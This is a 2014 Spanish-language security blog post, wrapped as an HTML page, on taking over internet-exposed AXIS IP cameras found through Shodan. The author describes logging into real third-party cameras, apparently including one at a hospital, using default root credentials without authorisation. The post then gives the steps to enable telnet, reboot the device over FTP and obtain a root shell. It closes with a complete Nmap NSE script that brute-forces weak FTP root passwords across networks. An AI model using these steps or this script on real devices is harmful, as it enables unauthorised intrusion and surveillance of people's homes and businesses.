@@ -1,0 +1,438 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Tomando El Control De Una Camara AXIS – Parte I - Security</title>
+  <meta name="author" content="q3rv0">
+
+  
+  <meta name="description" content="Hay veces en las que se me da por jugar con Shodan, realizando busqueda de routers, camaras IP u otros dispositivos, esta vez me puse a indagar las &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security</a></h1>
+  
+    <h2>Follow the white rabbit&#8230;.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:q3rv0.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Tomando El Control De Una Camara AXIS – Parte I</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-23T03:36:54+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>3:36 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Hay veces en las que se me da por jugar con Shodan, realizando busqueda de routers, camaras IP u otros dispositivos, esta vez me puse a indagar las camaras AXIS que se encontraban en la red publica.</p>
+
+<p>Simplemente poniedon AXIS en el buscador podemos encontrar unas cuantas disponibles,<!--more--> sin embargo la gran mayoria dispone de  autentificacion HTTP Digest para acceder al panel (pero no todas) incluso muchas poseen passwords como el clasico 123456.</p>
+
+<p><img src="http://i.imgur.com/bdRF413.png"></p>
+
+<p>Entonces me puse a averiguar informacion de este tipo de camaras, que bien son dispositivos con Linux arm* embebido y otra cosa interesante es que el user por defecto es root, asi que me puse a probar intentos de logueo con root:123456, root:root, siempre a travez de las direcciones que me arrojaba shodan y me cruze con una gran cantidad de dispositivos que realmente estaban configurados con esas credenciales y es mas algunos ni siquiera tenian activado la autentificacion por http.</p>
+
+<p>Me tope con algunas como estas:</p>
+
+<p>Lo que pareciera ser un hospital.</p>
+
+<p><img src="http://i.imgur.com/s0ANBji.png"></p>
+
+<p>Un pequeño local de electrodomesticos en Arabia Saudita</p>
+
+<p><img src="http://i.imgur.com/WkKgbxj.png"></p>
+
+<p>Una pancheria en Medellin Colombia.</p>
+
+<p><img src="http://i.imgur.com/GU7RYI3.png"></p>
+
+<p>Ahora que ya habia accedido al panel, queria ver la forma de tomar el control del mini OS GNU.</p>
+
+<p>Por empezar estos dispositivos cuentan con un servidor ftp configurado con las mismas credenciales que el http, pero por defecto el demonio telnet se encuentra desabilitado al inicio, pero esto no quita que pueda ser activado a travez del servidor web utilizando un editor de ficheros dentro de las opciones del sistema.</p>
+
+<p><img src="http://i.imgur.com/bcVGCF0.png"></p>
+
+<p>Solo basta con editar el fichero /etc/inittab y descomentar la linea:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#tnet:35:once:/usr/sbin/telnetd</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/j8iNHpW.png"></p>
+
+<p>Salvar los cambios, y reiniciar el dispositivo.</p>
+
+<p>Esto podemos hacerlo mediante el panel.</p>
+
+<p><img src="http://i.imgur.com/BwaG0JK.png"></p>
+
+<p>O bien por ftp con el siguiente comando.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>quote site reboot</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/7u4SzOM.png"></p>
+
+<p>Una vez iniciado el sistema seremos capaces de establecer una conexion por telnet como usuario root.</p>
+
+<p><img src="http://i.imgur.com/lHSLaKI.png"></p>
+
+<p>No quedando satisfecho con la pobre cantidad de camaras que me proveia shodan me dispuse a codear un NSE script para realizar sondeos con nmap y ver que me encontraba.</p>
+
+<p>La manera de identificar estos juguetitos es mirando el banner que tira el ftp, una vez identificado, el script simplemente intenta loguearse como root, utilizando contraseñas debiles y ademas comprueba si el panel se encuentra protegido.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="n">description</span> <span class="o">=</span> <span class="s">[[</span>
+</span><span class='line'><span class="s">Script que se encarga de buscar camaras AXIS que contengan credenciales debiles</span>
+</span><span class='line'><span class="s">o sin autentificacion HTTP digest.</span>
+</span><span class='line'><span class="s">]]</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">author</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">[Q]3rV[0]&quot;</span>
+</span><span class='line'><span class="n">license</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">Same as Nmap--See http://nmap.org/book/man-legal.html&quot;</span>
+</span><span class='line'><span class="n">categories</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;</span><span class="s">brute&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">auth&quot;</span><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">---</span>
+</span><span class='line'><span class="c1">-- </span>
+</span><span class='line'><span class="c1">-- @usage nmap --script=axis_search -vv -T4 -Pn -n xx.xx.xxx.x -p80,21</span>
+</span><span class='line'><span class="c1">-- @output</span>
+</span><span class='line'><span class="c1">--PORT   STATE SERVICE</span>
+</span><span class='line'><span class="c1">--21/tcp open  ftp</span>
+</span><span class='line'><span class="c1">--80/tcp open  http</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">--Host script results:</span>
+</span><span class='line'><span class="c1">--| axis:</span>
+</span><span class='line'><span class="c1">--|   Host = xxx.x.xxx.3</span>
+</span><span class='line'><span class="c1">--|   Version = AXIS M7010 Video Encoder 5.40.6.1 (2011) ready.</span>
+</span><span class='line'><span class="c1">--|_  Auth = root:root</span>
+</span><span class='line'><span class="c1">-- </span>
+</span><span class='line'><span class="c1">---</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">http&quot;</span>
+</span><span class='line'><span class="kd">local</span> <span class="n">ftp</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">ftp&quot;</span>
+</span><span class='line'><span class="kd">local</span> <span class="n">nmap</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">nmap&quot;</span>
+</span><span class='line'><span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">stdnse&quot;</span>
+</span><span class='line'><span class="kd">local</span> <span class="n">string</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">string&quot;</span>
+</span><span class='line'><span class="kd">local</span> <span class="n">table</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">table&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">hostrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
+</span><span class='line'>    <span class="kd">local</span> <span class="n">http_port</span><span class="p">,</span> <span class="n">ftp_port</span>
+</span><span class='line'>    <span class="n">http_port</span><span class="o">=</span><span class="n">nmap</span><span class="p">.</span><span class="n">get_port_state</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="p">{</span><span class="n">number</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">tcp&quot;</span><span class="p">})</span>
+</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">http_port</span> <span class="ow">and</span> <span class="ow">not</span> <span class="p">(</span><span class="n">http_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open&quot;</span> <span class="ow">or</span> <span class="n">http_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open|filtered&quot;</span><span class="p">)</span> <span class="k">then</span>
+</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>    <span class="n">ftp_port</span><span class="o">=</span><span class="n">nmap</span><span class="p">.</span><span class="n">get_port_state</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="p">{</span><span class="n">number</span><span class="o">=</span><span class="mi">21</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">tcp&quot;</span><span class="p">})</span>
+</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">ftp_port</span> <span class="ow">and</span> <span class="ow">not</span> <span class="p">(</span><span class="n">ftp_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open&quot;</span> <span class="ow">or</span> <span class="n">ftp_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open|filtered&quot;</span><span class="p">)</span> <span class="k">then</span>
+</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>    <span class="k">return</span> <span class="kc">true</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">local</span> <span class="n">out</span><span class="o">=</span><span class="p">{}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">local</span> <span class="n">dic</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;</span><span class="s">root&#39;</span><span class="p">,</span> <span class="mi">123456</span><span class="p">,</span> <span class="mi">1234</span><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Host = %s&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">.</span><span class="n">ip</span><span class="p">))</span>
+</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Version = %s&quot;</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">))</span>
+</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Auth = %s&quot;</span><span class="p">,</span> <span class="n">auth</span><span class="p">))</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">format_output</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="n">out</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">http_auth</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
+</span><span class='line'>    <span class="kd">local</span> <span class="n">response</span><span class="o">=</span><span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">/view/viewer_index.shtml&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">response</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">action</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
+</span><span class='line'>    <span class="kd">local</span> <span class="n">socket</span><span class="o">=</span><span class="n">nmap</span><span class="p">.</span><span class="n">new_socket</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">socket</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">21</span><span class="p">)</span>
+</span><span class='line'>    <span class="kd">local</span> <span class="n">buffer</span><span class="o">=</span><span class="n">stdnse</span><span class="p">.</span><span class="n">make_buffer</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\r</span><span class="s">?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="kd">local</span> <span class="n">code</span><span class="p">,</span> <span class="n">message_banner</span><span class="o">=</span><span class="n">ftp</span><span class="p">.</span><span class="n">read_reply</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">message_banner</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">AXIS&quot;</span><span class="p">)</span> <span class="k">then</span>
+</span><span class='line'>        <span class="kd">local</span> <span class="n">response</span><span class="o">=</span><span class="n">http_auth</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span><span class="o">==</span><span class="mi">401</span> <span class="ow">or</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span><span class="o">==</span><span class="mi">404</span> <span class="ow">or</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span><span class="o">==</span><span class="mi">403</span> <span class="k">then</span>
+</span><span class='line'>            <span class="k">for</span> <span class="n">n</span><span class="p">,</span><span class="n">pass</span> <span class="k">in</span> <span class="nb">ipairs</span><span class="p">(</span><span class="n">dic</span><span class="p">)</span> <span class="k">do</span>
+</span><span class='line'>                <span class="n">socket</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">USER root</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>                <span class="kd">local</span> <span class="n">code</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">ftp</span><span class="p">.</span><span class="n">read_reply</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">if</span> <span class="n">code</span><span class="o">==</span><span class="mi">331</span> <span class="k">then</span>
+</span><span class='line'>                    <span class="n">socket</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">PASS &quot;</span><span class="o">..</span><span class="n">pass</span><span class="o">..</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">end</span>
+</span><span class='line'>                <span class="kd">local</span> <span class="n">code</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">ftp</span><span class="p">.</span><span class="n">read_reply</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">if</span> <span class="n">message</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="s">User logged in, proceed.&quot;</span> <span class="k">then</span>
+</span><span class='line'>                    <span class="k">return</span> <span class="n">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">root:&#39;</span><span class="o">..</span><span class="n">pass</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">end</span>
+</span><span class='line'>            <span class="k">end</span>
+</span><span class='line'>        <span class="k">else</span>
+</span><span class='line'>            <span class="k">return</span> <span class="n">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">HTTP Blank Auth :)&#39;</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">Failed Auth :(&#39;</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Para terminar dejo una salida del script realizando un sondeo de prueba a la red xx.xxx.xx.x/24</p>
+
+<p><img src="http://i.imgur.com/yNeg2Th.png"></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-11-23T03:36:54+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>3:36 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/" title="Previous Post: Escribiendo un auxiliar para MSF">&laquo; Escribiendo un auxiliar para MSF</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/" title="Next Post: Desbordando el buffer en linux x86 (I)">Desbordando el buffer en linux x86 (I) &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/">Desbordando El Buffer en Linux X86 (I)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/">Tomando El Control De Una Camara AXIS – Parte I</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/">Escribiendo Un Auxiliar Para MSF</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/mysqli-eb-con-extractvalue/">MYSQLI EB Con Extractvalue()</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/">LFI+SQLI [Incluyendo Ficheros a Travez De Valores Enteros]</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - q3rv0 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
